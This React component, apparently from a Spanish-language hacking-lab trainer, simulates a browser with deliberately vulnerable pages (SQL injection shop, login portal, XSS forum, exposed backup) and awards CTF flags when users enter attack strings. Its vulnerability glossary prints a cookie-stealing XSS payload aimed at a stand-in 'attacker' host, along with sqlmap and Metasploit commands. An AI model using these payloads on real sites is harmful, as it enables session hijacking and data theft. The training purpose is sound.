import React, { useState, useEffect } from 'react';
import { Lab } from '../../types/cyber';
import { sounds } from '../../utils/audio';
import { 
  Globe, 
  ArrowLeft, 
  ArrowRight, 
  RotateCw, 
  Lock, 
  Unlock, 
  Code2, 
  Cookie, 
  Search, 
  ShieldAlert, 
  ExternalLink,
  Send,
  User,
  KeyRound,
  AlertTriangle,
  Info,
  Home,
  Plus,
  Sliders,
  ChevronDown
} from 'lucide-react';

interface TargetBrowserProps {
  lab: Lab;
  onFlagDiscovered?: (flag: string) => void;
  onActionTrigger?: (action: string) => void;
}

export const TargetBrowser: React.FC<TargetBrowserProps> = ({
  lab,
  onFlagDiscovered,
  onActionTrigger,
}) => {
  const initialUrl = lab.browserTargetUrl || `http://${lab.target.hostname || 'target.internal'}`;
  const [currentUrl, setCurrentUrl] = useState(initialUrl);
  const [urlInput, setUrlInput] = useState(initialUrl);
  const [showAdvanced, setShowAdvanced] = useState(false);
  const [viewSource, setViewSource] = useState(false);
  const [viewCookies, setViewCookies] = useState(false);
  const [activeTab, setActiveTab] = useState<'target' | 'cve_search'>('target');

  // Search in vulnerable shop
  const [shopQuery, setShopQuery] = useState('');
  const [shopSubmittedQuery, setShopSubmittedQuery] = useState('');

  // Login form
  const [loginUser, setLoginUser] = useState('');
  const [loginPass, setLoginPass] = useState('');
  const [loginStatus, setLoginStatus] = useState<string | null>(null);

  // Forum XSS
  const [commentText, setCommentText] = useState('');
  const [comments, setComments] = useState<Array<{ id: number; author: string; text: string; time: string }>>([
    { id: 1, author: 'admin_security', text: 'Recordatorio a todo el personal: No compartir credenciales por canales no cifrados.', time: '10:14 AM' },
    { id: 2, author: 'dev_ops', text: 'El nuevo endpoint de autenticación ya está activo en fase de pruebas internas.', time: '10:22 AM' }
  ]);
  const [xssAlertPayload, setXssAlertPayload] = useState<string | null>(null);

  // CVE Search Tool state
  const [cveSearchTerm, setCveSearchTerm] = useState('');

  useEffect(() => {
    const newUrl = lab.browserTargetUrl || `http://${lab.target.hostname || 'target.internal'}`;
    setCurrentUrl(newUrl);
    setUrlInput(newUrl);
    setShopQuery('');
    setShopSubmittedQuery('');
    setLoginStatus(null);
    setXssAlertPayload(null);
  }, [lab.id, lab.browserTargetUrl, lab.target.hostname]);

  const handleNavigate = (url: string) => {
    sounds.playCommandRun();
    let sanitized = url.trim();
    if (!sanitized.startsWith('http://') && !sanitized.startsWith('https://')) {
      sanitized = `http://${sanitized}`;
    }
    setCurrentUrl(sanitized);
    setUrlInput(sanitized);
    if (onActionTrigger) {
      onActionTrigger(`navigate:${sanitized}`);
    }
  };

  const handleShopSearch = (e: React.FormEvent) => {
    e.preventDefault();
    sounds.playKeyClick();
    setShopSubmittedQuery(shopQuery);

    if (onActionTrigger) {
      onActionTrigger(`sqli_query:${shopQuery}`);
    }

    if (shopQuery.includes('UNION') || shopQuery.includes('union') || shopQuery.includes('secret_flag')) {
      sounds.playSuccess();
      if (onFlagDiscovered) {
        onFlagDiscovered('KALI{sqli_union_bypass_auth_2026}');
      }
    }
  };

  const handleLoginSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    sounds.playCommandRun();

    if (loginUser === 'operador_sec' && loginPass === 'SuperSecurePass2026!') {
      setLoginStatus('success');
      sounds.playSuccess();
      if (onFlagDiscovered) {
        onFlagDiscovered('KALI{cleartext_http_sniffed_credentials}');
      }
    } else if (loginUser.includes("' OR 1=1") || loginPass.includes("' OR 1=1")) {
      setLoginStatus('sqli_bypass');
      sounds.playSuccess();
    } else {
      setLoginStatus('error');
      sounds.playError();
    }
  };

  const handlePostComment = (e: React.FormEvent) => {
    e.preventDefault();
    if (!commentText.trim()) return;
    sounds.playKeyClick();

    const newComment = {
      id: Date.now(),
      author: 'hacker_guest',
      text: commentText,
      time: 'Ahora'
    };
    setComments(prev => [...prev, newComment]);

    // Check for XSS injection
    if (commentText.includes('<script>') || commentText.includes('onerror=') || commentText.includes('document.cookie')) {
      setXssAlertPayload(commentText);
      sounds.playSuccess();
      if (onFlagDiscovered) {
        onFlagDiscovered('KALI{stored_xss_session_hijacking_master}');
      }
    }

    setCommentText('');
  };

  // Simulated CVE Database for research tab
  const cveDatabase = [
    {
      cve: 'CVE-2011-2523',
      name: 'vsftpd 2.3.4 Smiley Backdoor Execution',
      severity: 'CRITICAL (9.8)',
      desc: 'Una versión maliciosa del software FTP vsftpd introducida en los servidores maestros en 2011 abría una shell root en el puerto 6200/TCP al enviar un nombre de usuario con carita sonriente ":)".',
      tool: 'msfconsole: exploit/unix/ftp/vsftpd_234_backdoor'
    },
    {
      cve: 'CWE-89',
      name: 'SQL Injection (SQLi) - Inyección de Sentencias',
      severity: 'HIGH (8.5)',
      desc: 'Falta de consultas preparadas (Prepared Statements) que permite al atacante modificar la sintaxis SQL de la base de datos para extraer datos con sentencias UNION.',
      tool: 'sqlmap: sqlmap -u <URL> --dbs'
    },
    {
      cve: 'CWE-79',
      name: 'Cross-Site Scripting (XSS) Almacenado',
      severity: 'HIGH (8.1)',
      desc: 'La entrada del usuario no se sanitiza ni se codifica con HTML entities antes de almacenarse en la base de datos y mostrarse a otros clientes.',
      tool: 'Payloads: <script>document.location="http://attacker/?c="+document.cookie</script>'
    },
    {
      cve: 'MITRE T1071.004',
      name: 'DNS Tunneling & C2 Exfiltration',
      severity: 'HIGH (8.0)',
      desc: 'Exfiltración encubierta de datos codificando información confidencial en los prefijos de las consultas DNS dirigidas al servidor autoritativo del atacante.',
      tool: 'Wireshark: filtro "dns", decodificar subdominio con "echo ... | base64 -d"'
    },
    {
      cve: 'CWE-319',
      name: 'Cleartext Transmission of Sensitive Information (HTTP)',
      severity: 'MEDIUM (6.5)',
      desc: 'Transmisión de credenciales mediante protocolo HTTP sin cifrado TLS/SSL. Cualquier estación en la misma red local puede capturarlas con Wireshark.',
      tool: 'Wireshark: filtro "http.request.method == \\"POST\\""'
    }
  ];

  const filteredCves = cveDatabase.filter(c => 
    !cveSearchTerm || 
    c.cve.toLowerCase().includes(cveSearchTerm.toLowerCase()) ||
    c.name.toLowerCase().includes(cveSearchTerm.toLowerCase()) ||
    c.desc.toLowerCase().includes(cveSearchTerm.toLowerCase())
  );

  return (
    <div className="flex flex-col h-full bg-[#080d16] text-slate-200 border border-slate-800 rounded-xl overflow-hidden shadow-2xl">
      {/* Conventional Browser Top Tab Bar & Simulation Notice */}
      <div className="flex items-center justify-between px-3 pt-2 pb-1.5 bg-[#0e1422] border-b border-slate-800 select-none">
        <div className="flex items-center gap-2">
          {/* Active Tab */}
          <div
            onClick={() => setActiveTab('target')}
            className={`flex items-center gap-2 px-3 py-1.5 rounded-lg text-xs font-sans font-medium cursor-pointer transition-colors ${
              activeTab === 'target'
                ? 'bg-[#182238] text-slate-100 shadow-sm border border-slate-700/80'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            <Globe size={13} className="text-sky-400" />
            <span className="truncate max-w-[150px]">
              {currentUrl.replace('http://', '').replace('https://', '') || 'Web de Prueba'}
            </span>
          </div>

          {/* Indicator that it's a simulated lab sandbox browser */}
          <span className="inline-flex items-center gap-1.5 text-[11px] text-slate-300 bg-slate-900/90 px-2.5 py-1 rounded-full border border-slate-700/80">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
            <span className="font-sans">Simulador Web (Prácticas Seguras)</span>
          </span>
        </div>

        {/* Opciones avanzadas dropdown toggle */}
        <div className="relative">
          <button
            onClick={() => {
              sounds.playKeyClick();
              setShowAdvanced(!showAdvanced);
            }}
            className={`px-2.5 py-1 rounded-lg text-xs font-medium flex items-center gap-1.5 transition-colors cursor-pointer border ${
              showAdvanced || viewSource || viewCookies
                ? 'bg-cyan-950 text-cyan-300 border-cyan-700/80 font-semibold'
                : 'bg-slate-800/80 text-slate-300 border-slate-700/60 hover:bg-slate-700'
            }`}
            title="Herramientas técnicas para usuarios avanzados"
          >
            <Sliders size={12} />
            <span>Opciones avanzadas</span>
            <ChevronDown size={12} className={`transition-transform duration-200 ${showAdvanced ? 'rotate-180' : ''}`} />
          </button>

          {showAdvanced && (
            <div className="absolute right-0 top-8 z-40 bg-[#0e1628] border border-slate-700/90 rounded-xl shadow-2xl p-3 w-64 space-y-2 text-xs animate-in fade-in zoom-in-95 duration-100">
              <div className="border-b border-slate-800 pb-1.5">
                <span className="font-semibold text-slate-200 text-xs">Opciones avanzadas</span>
                <p className="text-[10px] text-slate-400 mt-0.5">Herramientas para inspeccionar el interior de la página web.</p>
              </div>

              <div className="space-y-1">
                <button
                  onClick={() => {
                    sounds.playKeyClick();
                    setViewSource(!viewSource);
                  }}
                  className={`w-full text-left p-2 rounded-lg flex flex-col gap-0.5 text-xs transition-colors cursor-pointer ${
                    viewSource ? 'bg-emerald-950/80 text-emerald-300 font-semibold' : 'text-slate-300 hover:bg-slate-850'
                  }`}
                >
                  <div className="flex items-center justify-between w-full">
                    <span className="flex items-center gap-1.5 font-medium">
                      <Code2 size={13} className="text-emerald-400" />
                      <span>Ver Código HTML</span>
                    </span>
                    <span className="text-[10px] text-slate-400">{viewSource ? 'Activo' : 'Abrir'}</span>
                  </div>
                  <span className="text-[10px] text-slate-400 font-normal">Muestra el código interno de la web para buscar comentarios y rutas ocultas.</span>
                </button>

                <button
                  onClick={() => {
                    sounds.playKeyClick();
                    setViewCookies(!viewCookies);
                  }}
                  className={`w-full text-left p-2 rounded-lg flex flex-col gap-0.5 text-xs transition-colors cursor-pointer ${
                    viewCookies ? 'bg-amber-950/80 text-amber-300 font-semibold' : 'text-slate-300 hover:bg-slate-850'
                  }`}
                >
                  <div className="flex items-center justify-between w-full">
                    <span className="flex items-center gap-1.5 font-medium">
                      <Cookie size={13} className="text-amber-400" />
                      <span>Ver Cookies de Sesión</span>
                    </span>
                    <span className="text-[10px] text-slate-400">{viewCookies ? 'Activo' : 'Abrir'}</span>
                  </div>
                  <span className="text-[10px] text-slate-400 font-normal">Revisa las cookies guardadas por el navegador para detectar tokens vulnerables.</span>
                </button>

                <button
                  onClick={() => {
                    sounds.playKeyClick();
                    setActiveTab(activeTab === 'cve_search' ? 'target' : 'cve_search');
                  }}
                  className={`w-full text-left p-2 rounded-lg flex flex-col gap-0.5 text-xs transition-colors cursor-pointer ${
                    activeTab === 'cve_search' ? 'bg-sky-950/80 text-sky-300 font-semibold' : 'text-slate-300 hover:bg-slate-850'
                  }`}
                >
                  <div className="flex items-center justify-between w-full">
                    <span className="flex items-center gap-1.5 font-medium">
                      <Search size={13} className="text-sky-400" />
                      <span>Glosario de Vulnerabilidades</span>
                    </span>
                    <span className="text-[10px] text-slate-400">{activeTab === 'cve_search' ? 'Activo' : 'Abrir'}</span>
                  </div>
                  <span className="text-[10px] text-slate-400 font-normal">Consulta qué significa cada vulnerabilidad y cómo se explota.</span>
                </button>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Conventional Browser Navigation Controls Bar (Back, Forward, Reload, Home, Address Bar) */}
      {activeTab === 'target' && (
        <div className="px-3 py-2 bg-[#141c2e] border-b border-slate-800 flex items-center gap-1.5 sm:gap-2">
          {/* Back Button */}
          <button
            onClick={() => sounds.playKeyClick()}
            className="p-1.5 rounded-full text-slate-400 hover:text-slate-200 hover:bg-slate-700/60 transition-colors"
            title="Atrás"
          >
            <ArrowLeft size={14} />
          </button>

          {/* Forward Button */}
          <button
            onClick={() => sounds.playKeyClick()}
            className="p-1.5 rounded-full text-slate-500 hover:text-slate-300 hover:bg-slate-700/60 transition-colors"
            title="Adelante"
          >
            <ArrowRight size={14} />
          </button>

          {/* Reload Button */}
          <button
            onClick={() => handleNavigate(currentUrl)}
            className="p-1.5 rounded-full text-slate-400 hover:text-slate-200 hover:bg-slate-700/60 transition-colors"
            title="Volver a cargar"
          >
            <RotateCw size={14} />
          </button>

          {/* Home Button */}
          <button
            onClick={() => handleNavigate(lab.browserTargetUrl || `http://${lab.target.hostname}`)}
            className="p-1.5 rounded-full text-slate-400 hover:text-slate-200 hover:bg-slate-700/60 transition-colors hidden xs:flex"
            title="Página principal del laboratorio"
          >
            <Home size={14} />
          </button>

          {/* Modern Omnibox / Search & Address Bar */}
          <form
            onSubmit={(e) => {
              e.preventDefault();
              handleNavigate(urlInput);
            }}
            className="relative flex-1 flex items-center bg-[#0a0f1b] hover:bg-[#0c1222] focus-within:bg-[#090d18] border border-slate-700/80 focus-within:border-sky-500 rounded-full px-3 py-1.5 transition-all shadow-inner"
          >
            {currentUrl.startsWith('https://') ? (
              <span title="Conexión segura (HTTPS)" className="mr-2 flex items-center shrink-0">
                <Lock size={13} className="text-emerald-400" />
              </span>
            ) : (
              <span title="Conexión HTTP no cifrada (Inseguro)" className="mr-2 flex items-center shrink-0">
                <Unlock size={13} className="text-amber-400" />
              </span>
            )}

            <input
              type="text"
              value={urlInput}
              onChange={(e) => setUrlInput(e.target.value)}
              className="w-full bg-transparent text-xs font-sans text-slate-200 placeholder-slate-500 focus:outline-none"
              placeholder="Escribe la dirección web o selecciona una de abajo..."
              spellCheck={false}
              autoCapitalize="none"
              autoCorrect="off"
            />

            {!currentUrl.startsWith('https://') && (
              <span className="text-[10px] text-amber-400 font-sans hidden md:inline ml-2 whitespace-nowrap bg-amber-950/40 px-1.5 py-0.5 rounded border border-amber-800/40">
                No seguro
              </span>
            )}
          </form>

          {/* Go / Navigate Button */}
          <button
            onClick={() => handleNavigate(urlInput)}
            className="px-3 py-1.5 rounded-full bg-sky-600 hover:bg-sky-500 text-white font-sans text-xs font-semibold active:scale-95 transition-all shadow"
          >
            Ir
          </button>
        </div>
      )}

      {/* Marcadores directos a páginas de prueba */}
      {activeTab === 'target' && (
        <div className="px-3 py-1.5 bg-[#0d1422] border-b border-slate-800/80 flex items-center gap-1.5 overflow-x-auto no-scrollbar text-xs font-sans">
          <span className="text-slate-400 text-[11px] font-medium shrink-0">Páginas de prueba:</span>
          {[
            { label: 'Tienda con buscador', url: 'http://shop.target.internal/search' },
            { label: 'Acceso de usuarios', url: 'http://auth-portal.lan/login' },
            { label: 'Panel de control', url: 'http://corp-gateway.local/admin' },
            { label: 'Foro de mensajes', url: 'http://forum.internal/comments' },
            { label: 'Copia de seguridad', url: 'http://target.internal/secret_backup_admin' }
          ].map((quick) => (
            <button
              key={quick.url}
              onClick={() => handleNavigate(quick.url)}
              className={`px-2.5 py-1 rounded-md text-[11px] font-sans whitespace-nowrap transition-colors border cursor-pointer ${
                currentUrl === quick.url
                  ? 'bg-sky-950/70 text-sky-300 border-sky-700/60 font-semibold'
                  : 'bg-slate-800/50 hover:bg-slate-700/70 text-slate-300 border-slate-700/40'
              }`}
            >
              {quick.label}
            </button>
          ))}
        </div>
      )}

      {/* Main Browser Viewport */}
      <div className="flex-1 overflow-y-auto bg-[#070b13] p-4 relative">
        {/* Developer Tools Overlays */}
        {viewSource && (
          <div className="mb-4 p-3 rounded-lg bg-[#0b1220] border border-emerald-600/50 font-mono text-xs text-emerald-300">
            <div className="flex items-center justify-between pb-1.5 border-b border-slate-700 mb-2">
              <span className="font-bold flex items-center gap-1.5">
                <Code2 size={14} /> Código Fuente HTML Inspeccionado:
              </span>
              <button onClick={() => setViewSource(false)} className="text-slate-400 hover:text-slate-200">
                Cerrar
              </button>
            </div>
            <pre className="whitespace-pre-wrap text-[11px] leading-relaxed text-slate-300">
{`<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Target Appliance Web Portal</title>
  <!-- COMENTARIO DE SEGURIDAD INTERNO PARA DESARROLLADORES: -->
  <!-- TODO: Asegurarse de sanitizar parámetro id en las consultas SELECT * FROM products WHERE id = '$id' -->
  <!-- RUTA DE BACKUP INTERNA: /secret_backup_admin/config.backup -->
</head>
<body>
  <div id="app">
    <!-- Formulario de autenticación o búsqueda -->
  </div>
</body>
</html>`}
            </pre>
          </div>
        )}

        {viewCookies && (
          <div className="mb-4 p-3 rounded-lg bg-[#0b1220] border border-amber-600/50 font-mono text-xs text-amber-300">
            <div className="flex items-center justify-between pb-1.5 border-b border-slate-700 mb-2">
              <span className="font-bold flex items-center gap-1.5">
                <Cookie size={14} /> Cookies del Navegador & Sesión:
              </span>
              <button onClick={() => setViewCookies(false)} className="text-slate-400 hover:text-slate-200">
                Cerrar
              </button>
            </div>
            <div className="space-y-1 text-[11px] text-slate-300">
              <div>
                <span className="text-amber-400 font-semibold">session_id:</span>{' '}
                <span className="text-slate-100 font-mono">s3cr3t_4dm1n_t0k3n_99</span> (HttpOnly: False)
              </div>
              <div>
                <span className="text-amber-400 font-semibold">auth_flag:</span>{' '}
                <span className="text-emerald-400 font-mono font-bold">KALI{'{wireshark_tcp_stream_admin_cookie}'}</span>
              </div>
              <div>
                <span className="text-amber-400 font-semibold">user_role:</span>{' '}
                <span className="text-slate-100 font-mono">administrator</span>
              </div>
            </div>
          </div>
        )}

        {/* Simulated Web Application Pages based on URL */}
        {activeTab === 'target' ? (
          <div className="max-w-2xl mx-auto space-y-4">
            {/* 1. SHOP SEARCH (SQLi LAB 04) */}
            {currentUrl.includes('shop') || currentUrl.includes('search') ? (
              <div className="p-4 rounded-xl bg-[#0c1424] border border-slate-800 shadow-xl space-y-4">
                <div className="flex items-center justify-between border-b border-slate-800 pb-3">
                  <div>
                    <h2 className="text-lg font-bold text-slate-100">CyberSec Electronics Store</h2>
                    <p className="text-xs text-slate-400">Catálogo interno de componentes de telecomunicación</p>
                  </div>
                  <span className="px-2 py-0.5 rounded bg-emerald-950 text-emerald-400 border border-emerald-800/40 text-xs font-mono">
                    Online
                  </span>
                </div>

                {/* Search Bar */}
                <form onSubmit={handleShopSearch} className="flex gap-2">
                  <div className="relative flex-1">
                    <input
                      type="text"
                      value={shopQuery}
                      onChange={(e) => setShopQuery(e.target.value)}
                      placeholder="Buscar producto por nombre o ID (ej: router, switch, ' OR 1=1 --)..."
                      className="w-full pl-3 pr-3 py-2 rounded bg-slate-900 border border-slate-700 text-xs font-mono text-slate-100 focus:outline-none focus:border-sky-500"
                    />
                  </div>
                  <button
                    type="submit"
                    className="px-4 py-2 rounded bg-sky-600 hover:bg-sky-500 text-white font-mono text-xs font-bold transition-colors"
                  >
                    Buscar
                  </button>
                </form>

                {/* SQL Query Error or Results */}
                {shopSubmittedQuery === "'" && (
                  <div className="p-3 rounded bg-rose-950/40 border border-rose-800/60 text-xs font-mono text-rose-300">
                    <div className="font-bold flex items-center gap-1.5 mb-1">
                      <AlertTriangle size={14} className="text-rose-400" />
                      Error en la base de datos MySQL:
                    </div>
                    <div>
                      You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'\'' at line 1 in <b>/var/www/html/search.php</b>
                    </div>
                  </div>
                )}

                {(shopSubmittedQuery.includes('OR 1=1') || shopSubmittedQuery.includes("' OR '1'='1")) && (
                  <div className="space-y-2">
                    <div className="text-xs font-mono text-emerald-400 font-semibold">
                      [+] ¡Bypass de consulta exitoso! Mostrando todos los 5 artículos de la base de datos:
                    </div>
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs font-mono">
                      <div className="p-2.5 rounded bg-slate-900 border border-slate-800">
                        <div className="font-bold text-slate-100">Router Cisco ISR 4331</div>
                        <div className="text-slate-400 text-[11px]">Stock: 12 unidades | $1,200</div>
                      </div>
                      <div className="p-2.5 rounded bg-slate-900 border border-slate-800">
                        <div className="font-bold text-slate-100">Switch Gigabit Gestionable</div>
                        <div className="text-slate-400 text-[11px]">Stock: 45 unidades | $450</div>
                      </div>
                      <div className="p-2.5 rounded bg-slate-900 border border-slate-800">
                        <div className="font-bold text-slate-100">Firewall Fortigate 60F</div>
                        <div className="text-slate-400 text-[11px]">Stock: 8 unidades | $890</div>
                      </div>
                    </div>
                  </div>
                )}

                {(shopSubmittedQuery.includes('UNION') || shopSubmittedQuery.includes('secret_flag')) && (
                  <div className="p-4 rounded bg-emerald-950/40 border border-emerald-500/80 text-xs font-mono space-y-2">
                    <div className="font-bold text-emerald-300 flex items-center gap-2">
                      <ShieldAlert size={16} />
                      ¡INYECCIÓN SQL UNION EXITOSA! Tabla de Administración Volcada:
                    </div>
                    <table className="w-full text-left border-collapse text-[11px]">
                      <thead>
                        <tr className="border-b border-emerald-800/60 text-emerald-400">
                          <th className="py-1">ID</th>
                          <th className="py-1">Usuario</th>
                          <th className="py-1">Password Hash</th>
                          <th className="py-1">Flag de Seguridad</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-emerald-900/40 text-slate-200">
                        <tr>
                          <td className="py-1">1</td>
                          <td className="py-1 font-bold text-sky-300">superadmin</td>
                          <td className="py-1 font-mono text-slate-400">$6$rounds=5000$...</td>
                          <td className="py-1 font-mono font-bold text-emerald-300">
                            KALI{'{sqli_union_bypass_auth_2026}'}
                          </td>
                        </tr>
                      </tbody>
                    </table>
                  </div>
                )}

                {!shopSubmittedQuery && (
                  <div className="text-xs text-slate-500 font-mono text-center py-4">
                    Introduce un término de búsqueda para consultar la base de datos de productos.
                  </div>
                )}
              </div>
            ) : currentUrl.includes('login') ? (
              /* 2. AUTH LOGIN PORTAL (LAB 02) */
              <div className="max-w-md mx-auto p-5 rounded-xl bg-[#0c1424] border border-slate-800 shadow-xl space-y-4">
                <div className="text-center space-y-1">
                  <div className="w-10 h-10 rounded-full bg-sky-950 border border-sky-800/60 flex items-center justify-center mx-auto text-sky-400">
                    <KeyRound size={20} />
                  </div>
                  <h2 className="text-base font-bold text-slate-100">Portal de Acceso de Operadores</h2>
                  <p className="text-xs text-slate-400">Inicia sesión con tus credenciales de red</p>
                </div>

                <form onSubmit={handleLoginSubmit} className="space-y-3">
                  <div>
                    <label className="block text-xs font-mono text-slate-300 mb-1">Usuario</label>
                    <input
                      type="text"
                      value={loginUser}
                      onChange={(e) => setLoginUser(e.target.value)}
                      placeholder="ej: operador_sec"
                      className="w-full px-3 py-2 rounded bg-slate-900 border border-slate-700 text-xs font-mono text-slate-100 focus:outline-none focus:border-sky-500"
                    />
                  </div>

                  <div>
                    <label className="block text-xs font-mono text-slate-300 mb-1">Contraseña</label>
                    <input
                      type="password"
                      value={loginPass}
                      onChange={(e) => setLoginPass(e.target.value)}
                      placeholder="••••••••••••"
                      className="w-full px-3 py-2 rounded bg-slate-900 border border-slate-700 text-xs font-mono text-slate-100 focus:outline-none focus:border-sky-500"
                    />
                  </div>

                  <button
                    type="submit"
                    className="w-full py-2 rounded bg-sky-600 hover:bg-sky-500 text-white font-mono text-xs font-bold transition-colors shadow-lg shadow-sky-950"
                  >
                    Iniciar Sesión
                  </button>
                </form>

                {loginStatus === 'success' && (
                  <div className="p-3 rounded bg-emerald-950/40 border border-emerald-500/80 text-xs font-mono text-emerald-300 space-y-1">
                    <div className="font-bold">¡Autenticación Correcta!</div>
                    <div>Bandera de sesión: <b>KALI{'{cleartext_http_sniffed_credentials}'}</b></div>
                  </div>
                )}

                {loginStatus === 'error' && (
                  <div className="p-3 rounded bg-rose-950/40 border border-rose-800/60 text-xs font-mono text-rose-300">
                    Credenciales incorrectas. (Pista: Inspecciona los paquetes HTTP en Wireshark).
                  </div>
                )}
              </div>
            ) : currentUrl.includes('comments') || currentUrl.includes('forum') ? (
              /* 3. FORUM / XSS (LAB 11) */
              <div className="p-4 rounded-xl bg-[#0c1424] border border-slate-800 shadow-xl space-y-4">
                <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                  <div>
                    <h2 className="text-base font-bold text-slate-100">Foro Comunitario de Soporte Técnico</h2>
                    <p className="text-xs text-slate-400">Deja tu comentario o consulta de asistencia</p>
                  </div>
                </div>

                {/* XSS simulated alert modal */}
                {xssAlertPayload && (
                  <div className="p-3 rounded bg-amber-950/50 border border-amber-500/80 text-xs font-mono text-amber-200 space-y-2">
                    <div className="font-bold flex items-center gap-1.5 text-amber-300">
                      <AlertTriangle size={15} />
                      ¡ALERTA XSS EJECUTADA EN EL CLIENTE!
                    </div>
                    <div className="p-2 rounded bg-black/50 text-[11px] text-emerald-300 font-mono">
                      alert(document.cookie) =&gt; session_id=s3cr3t_4dm1n_t0k3n_99; auth_flag=KALI{'{stored_xss_session_hijacking_master}'}
                    </div>
                    <div className="text-[11px] text-slate-300">
                      El navegador ejecutó tu script malicioso porque el foro no escapa las etiquetas &lt;script&gt;.
                    </div>
                  </div>
                )}

                {/* List of comments */}
                <div className="space-y-2 max-h-56 overflow-y-auto">
                  {comments.map((c) => (
                    <div key={c.id} className="p-3 rounded bg-slate-900/80 border border-slate-800 text-xs space-y-1">
                      <div className="flex items-center justify-between text-[11px] text-slate-400">
                        <span className="font-semibold text-sky-400">@{c.author}</span>
                        <span>{c.time}</span>
                      </div>
                      <div className="text-slate-200 font-mono">{c.text}</div>
                    </div>
                  ))}
                </div>

                {/* Comment box */}
                <form onSubmit={handlePostComment} className="space-y-2">
                  <textarea
                    value={commentText}
                    onChange={(e) => setCommentText(e.target.value)}
                    placeholder="Escribe tu comentario o inyecta tu payload XSS (<script>alert(document.cookie)</script>)..."
                    rows={2}
                    className="w-full p-2.5 rounded bg-slate-900 border border-slate-700 text-xs font-mono text-slate-100 focus:outline-none focus:border-sky-500"
                  />
                  <div className="flex justify-end">
                    <button
                      type="submit"
                      className="px-4 py-1.5 rounded bg-sky-600 hover:bg-sky-500 text-white font-mono text-xs font-bold transition-colors"
                    >
                      Publicar Comentario
                    </button>
                  </div>
                </form>
              </div>
            ) : currentUrl.includes('secret_backup_admin') ? (
              /* 4. BACKUP ENDPOINT (LAB 05) */
              <div className="p-4 rounded-xl bg-[#0c1424] border border-slate-800 shadow-xl space-y-3 font-mono text-xs">
                <h2 className="text-sm font-bold text-slate-200 border-b border-slate-800 pb-2">
                  Index of /secret_backup_admin/
                </h2>
                <div className="space-y-1 text-slate-300">
                  <div className="hover:text-sky-300 cursor-pointer">📁 [DIR] ../</div>
                  <div className="p-2 rounded bg-slate-900 border border-slate-800 text-emerald-400">
                    📄 <span className="font-bold">config.backup</span> (1.4 KB) - Última modificación: Ayer 23:40
                    <div className="mt-2 text-slate-300 text-[11px] bg-black/40 p-2 rounded whitespace-pre-wrap">
                      API_KEY=live_tok_99812903
                      ADMIN_FLAG=KALI{'{gobuster_hidden_endpoint_leaked}'}
                      DB_SERVER=127.0.0.1
                    </div>
                  </div>
                </div>
              </div>
            ) : (
              /* DEFAULT HOST PAGE */
              <div className="p-5 rounded-xl bg-[#0c1424] border border-slate-800 shadow-xl space-y-3">
                <div className="flex items-center gap-2 text-emerald-400">
                  <Globe size={18} />
                  <h2 className="text-base font-bold">Servidor Apache/2.4 (Ubuntu) en {lab.target.ip}</h2>
                </div>
                <p className="text-xs text-slate-300 leading-relaxed font-mono">
                  Bienvenido al portal institucional. Este servidor está activo y escuchando en los puertos configurados.
                  Utiliza las herramientas de Kali o Wireshark para auditar las rutas y servicios asociados.
                </p>
                <div className="p-3 rounded bg-slate-900 border border-slate-800 text-xs font-mono space-y-1 text-slate-400">
                  <div>Hostname: <span className="text-sky-300">{lab.target.hostname}</span></div>
                  <div>IP: <span className="text-emerald-300">{lab.target.ip}</span></div>
                  <div>Servicios activos: {lab.target.services.join(', ')}</div>
                </div>
              </div>
            )}
          </div>
        ) : (
          /* CVE & OSINT SEARCH TAB */
          <div className="max-w-2xl mx-auto space-y-4">
            <div className="relative">
              <input
                type="text"
                value={cveSearchTerm}
                onChange={(e) => setCveSearchTerm(e.target.value)}
                placeholder="Buscar vulnerabilidad, CVE o comando (ej: vsftpd, sqli, dns, xss)..."
                className="w-full pl-9 pr-3 py-2.5 rounded-lg bg-slate-900 border border-slate-700 text-xs font-mono text-slate-100 focus:outline-none focus:border-sky-500"
              />
              <Search size={15} className="absolute left-3 top-3 text-slate-400" />
            </div>

            <div className="space-y-3">
              {filteredCves.map((item) => (
                <div key={item.cve} className="p-3.5 rounded-xl bg-[#0c1424] border border-slate-800 space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="font-mono text-xs font-bold text-sky-400">{item.cve}</span>
                    <span className="px-2 py-0.5 rounded bg-rose-950/80 text-rose-300 border border-rose-800/60 text-[10px] font-mono font-bold">
                      {item.severity}
                    </span>
                  </div>
                  <h3 className="text-xs font-bold text-slate-200">{item.name}</h3>
                  <p className="text-xs text-slate-400 leading-relaxed">{item.desc}</p>
                  <div className="p-2 rounded bg-slate-950 border border-slate-800 text-[11px] font-mono text-emerald-400">
                    <span className="text-slate-500 font-semibold">Técnica/Módulo: </span>
                    {item.tool}
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
